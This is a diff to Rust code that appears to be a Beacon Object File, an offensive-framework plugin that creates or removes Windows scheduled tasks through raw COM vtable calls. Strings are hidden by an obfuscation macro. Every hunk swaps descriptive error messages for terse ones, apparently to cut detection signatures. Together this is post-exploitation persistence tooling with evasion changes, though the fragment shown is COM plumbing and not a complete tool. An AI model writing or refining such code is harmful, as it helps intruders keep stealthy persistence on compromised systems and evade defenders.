@@ -90,7 +90,7 @@ unsafe fn run_inner(parser: &mut rustbof::data::DataParser) -> Result<(), &'stat
     let remove = mode_s.eq_ignore_ascii_case("remove");
 
     unsafe { co_initialize_ex(core::ptr::null_mut(), 0) }
-        .map_err(|_| "CoInitializeEx resolve")?;
+        .map_err(|_| "com init")?;
     let mut svc: *mut c_void = core::ptr::null_mut();
     let hr = unsafe {
         co_create_instance(
@@ -100,10 +100,10 @@ unsafe fn run_inner(parser: &mut rustbof::data::DataParser) -> Result<(), &'stat
             IID_BYTES.as_ptr(),
             &mut svc,
         )
-    }.map_err(|_| "CoCreateInstance resolve")?;
+    }.map_err(|_| "create instance")?;
     if hr != S_OK || svc.is_null() {
         unsafe { let _ = co_uninitialize(); };
-        return Err("ITaskService CoCreateInstance failed");
+        return Err("task svc create");
     }
 
     let vtbl = unsafe { *(svc as *mut *mut usize) };
@@ -230,40 +230,40 @@ unsafe fn do_connect(vtbl: *mut usize, svc: *mut c_void) -> Result<(), &'static 
     let connect_fn: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, *const u16) -> i32 =
         core::mem::transmute(*vtbl.add(3));
     let hr = unsafe { connect_fn(svc, core::ptr::null(), core::ptr::null(), core::ptr::null(), core::ptr::null()) };
-    if hr != S_OK { Err("ITaskService::Connect failed") } else { Ok(()) }
+    if hr != S_OK { Err("task connect") } else { Ok(()) }
 }
 
 unsafe fn get_root_folder(vtbl: *mut usize, svc: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
     obf! { let root_ascii = "\\"; }
     let mut root_w = [0u16; 8];
     common::str_util::ascii_to_wide_buf(root_ascii.as_bytes(), &mut root_w);
-    let bstr = sys_alloc_string(root_w.as_ptr()).map_err(|_| "SysAllocString")?;
+    let bstr = sys_alloc_string(root_w.as_ptr()).map_err(|_| "str alloc")?;
     let gf_fn: unsafe extern "system" fn(*mut c_void, *const u16, *mut *mut c_void) -> i32 =
         core::mem::transmute(*vtbl.add(4));
     let hr = unsafe { gf_fn(svc, bstr, out) };
     let _ = sys_free_string(bstr);
-    if hr != S_OK { Err("GetFolder failed") } else { Ok(()) }
+    if hr != S_OK { Err("folder get") } else { Ok(()) }
 }
 
 unsafe fn get_registration_info(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
     let fn_: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
         core::mem::transmute(*vtbl.add(4));
     let hr = unsafe { fn_(def, out) };
-    if hr != S_OK { Err("get_RegistrationInfo failed") } else { Ok(()) }
+    if hr != S_OK { Err("reg info") } else { Ok(()) }
 }
 
 unsafe fn get_principal(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
     let fn_: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
         core::mem::transmute(*vtbl.add(6));
     let hr = unsafe { fn_(def, out) };
-    if hr != S_OK { Err("get_Principal failed") } else { Ok(()) }
+    if hr != S_OK { Err("principal get") } else { Ok(()) }
 }
 
 unsafe fn get_settings(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
     let fn_: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> i32 =
         core::mem::transmute(*vtbl.add(7));
     let hr = unsafe { fn_(def, out) };
-    if hr != S_OK { Err("get_Settings failed") } else { Ok(()) }
+    if hr != S_OK { Err("settings get") } else { Ok(()) }
 }
 
 unsafe fn get_exec_action(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_void) -> Result<(), &'static str> {
@@ -271,7 +271,7 @@ unsafe fn get_exec_action(vtbl: *mut usize, def: *mut c_void, out: *mut *mut c_v
     let new_act: unsafe extern "system" fn(*mut c_void, i32, *mut *mut c_void) -> i32 =
         core::mem::transmute(*vtbl.add(9));
     let hr = unsafe { new_act(def, 0, out) };
-    if hr != S_OK { Err("NewAction failed") } else { Ok(()) }
+    if hr != S_OK { Err("action new") } else { Ok(()) }
 }
 
 unsafe fn release_obj(vtbl: *mut usize, obj: *mut c_void) {
